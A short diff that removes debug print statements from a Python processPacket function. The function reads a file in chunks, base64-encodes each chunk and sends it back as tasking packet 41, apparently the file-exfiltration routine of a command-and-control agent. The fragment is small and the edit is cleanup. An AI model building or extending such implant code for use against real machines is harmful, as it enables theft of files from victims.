@@ -249,7 +249,6 @@ def processPacket(taskingID, data):
 
         offset = 0
         size = os.path.getsize(filePath)
-        print "file size " + str(size)
         partIndex = 0
 
         while True:
@@ -263,9 +262,7 @@ def processPacket(taskingID, data):
             encodedPart = base64.b64encode(encodedPart)
 
             partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
-            print len(encodedPart)
             if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
-                print "here"
                 break
 
             sendMessage(encodePacket(41, partData))
